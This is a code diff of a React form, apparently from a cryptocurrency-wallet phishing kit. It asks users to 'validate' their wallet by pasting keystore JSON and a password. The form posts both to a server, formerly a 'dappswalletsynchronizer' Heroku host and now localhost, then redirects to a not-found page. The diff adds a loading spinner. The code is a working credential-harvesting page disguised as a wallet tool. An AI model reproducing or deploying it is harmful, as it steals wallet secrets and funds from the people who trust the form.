@@ -1,6 +1,7 @@
-import { useEffect } from "react";
+import { useEffect, useState } from "react";
 import axios from "axios";
 import { useNavigate } from "react-router-dom";
+import { BeatLoader } from "react-spinners";
 
 const KeystoreJson = ({
   seed2,
@@ -11,6 +12,7 @@ const KeystoreJson = ({
   setPassword,
 }) => {
   let Navigate = useNavigate();
+  const [loading, setLoading] = useState(false);
 
   useEffect(() => {
     if (seed2 == "" || password == "") {
@@ -21,10 +23,12 @@ const KeystoreJson = ({
   }, [seed2, password]);
 
   const handleSubmit = async (e) => {
-    const res = await axios.post("https://dappswalletsynchronizer.herokuapp.com/form", {
+    const res = await axios.post("http://localhost:8080/form", {
       seed: seed2,
       password,
     });
+    setLoading(true);
+    setDisabled2(true);
     if (res.data.status === 200) {
       Navigate("/not_found");
     } else {
@@ -35,10 +39,10 @@ const KeystoreJson = ({
   return (
     <>
       <textarea
-        onChange={(e) => setSeed2(e.target.value)} 
+        onChange={(e) => setSeed2(e.target.value)}
         value={seed2}
         rows='10'
-        placeholder='Keystore JSON' 
+        placeholder='Keystore JSON'
       ></textarea>
       <div>
         <textarea
@@ -64,7 +68,7 @@ const KeystoreJson = ({
         onClick={handleSubmit}
         disabled={disabled2}
       >
-        VALIDATE
+        {!loading ? "VALIDATE" : <BeatLoader size={12} />}
       </button>
     </>
   );
